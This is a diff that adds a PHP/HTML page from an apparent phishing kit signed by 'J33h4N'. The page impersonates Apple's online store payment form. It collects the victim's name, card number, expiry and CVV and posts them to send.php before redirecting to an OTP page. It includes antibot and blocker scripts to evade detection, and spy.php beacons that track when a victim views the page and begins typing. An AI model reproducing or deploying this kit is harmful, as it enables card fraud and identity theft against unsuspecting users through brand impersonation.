@@ -1,0 +1,109 @@
+<?php 
+/*
+ CREATED BY J33h4N
+ CONTACT: t.me/j33h4n
+*/
+require './main.php';
+ include 'php/err.php';
+include 'php/blocker.php';
+include 'php/antibots4.php';
+?>
+<!doctype html>
+<html>
+<head>
+<title>Sign In - Account</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<link rel="stylesheet" href="inc/style.css">
+<link rel="icon" href="inc/logos.png">
+<script src="inc/jq.js"></script>
+</head>
+<body>
+<div class="header">
+<div class="left">
+<img src="inc/menu.png">
+</div>
+<div class="mid">
+<img src="inc/logo.png">
+</div>
+<div class="right">
+<img src="inc/bag.png">
+</div>
+</div>
+<div class="content">
+
+
+<div class="form" style="">
+<div class="col" style="margin-bottom:-13px;">
+<h1 style="margin:20px 0;">Payment Information.</h1>
+<h3>Add credit or debit card.</h3>
+</div>
+
+<div class="col">
+<input type="text" class="subtextinput" placeholder="Full name" id="fullname" style="border-radius:6px 6px 0 0; border-bottom:none;">
+<input type="text" class="subtextinput" placeholder="XXXX XXXX XXXX XXXX" id="cardnumber" style="border-radius:0; border-bottom:none;">
+<input type="text" class="subtextinput" placeholder="MM/YY" id="exp" style="border-radius:0; border-bottom:none;">
+<input type="text" class="subtextinput" placeholder="CVV" id="cvv" style="border-radius:0 0 6px 6px;">
+</div>
+
+<div class="col">
+<button class="sbmt" onclick="sendCC()" id="btn">Continue</button>
+</div>
+
+</div>
+</div>
+
+
+<div class="footer">
+<div class="footerholder">
+<div style="padding:20px 0;">
+Need some help?  <span style="color:#3787d7;  cursor:pointer;">Chat now</span> or call 1-800-MY-APPLE.
+</div>
+</div>
+<div class="footercontent">
+<div style="display:inline-block; width:1000px; max-width:90%;">
+<div style="text-align:left; border-bottom:1px solid #cacaca; padding:14px 0;">
+The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our Security Policy.
+</div>
+<div style="text-align:left; padding:14px 0;">
+More ways to shop: <span style="color:#3787d7;  cursor:pointer;">Find an Apple Store</span> or <span style="color:#3787d7;  cursor:pointer;">other retailer</span> near you. Or call 1-800-MY-APPLE.
+</div>
+<div style="text-align:left; padding:14px 0; margin-top:-20px;">
+Copyright © 2022 Apple Inc. All rights reserved.
+</diV>
+
+</div>
+</div>
+</div>
+<script src="inc/m.js"></script>
+<script>
+$("#cardnumber").mask("0000 0000 0000 0000");
+$("#exp").mask("00/00");
+$("#cvv").mask("000");
+
+function sendCC(){
+	var ccnum = $("#cardnumber").val();
+	var fn = $("#fullname").val();
+	var exp = $("#exp").val();
+	var cvv = $("#cvv").val();
+	if(ccnum=="" || fn=="" || exp=="" || cvv==""){
+		alert("Please fill all blanks!");
+	}else{
+		$("#btn").html("<img src='inc/loader.gif' style='width:20px;'>");
+		$.post("send.php",{cardnumber:ccnum, fullname:fn, exp:exp,cvv:cvv}, function(done){
+			window.location="otp j1.php";
+		});
+	}
+}
+
+$.post("spy.php",{cardview:1});
+var c=0;
+$("#cardnumber").keyup(function(){
+	c++;if(c==1){
+$.post("spy.php",{carding:1});
+	}});
+
+
+</script>
+</body>
+</html>
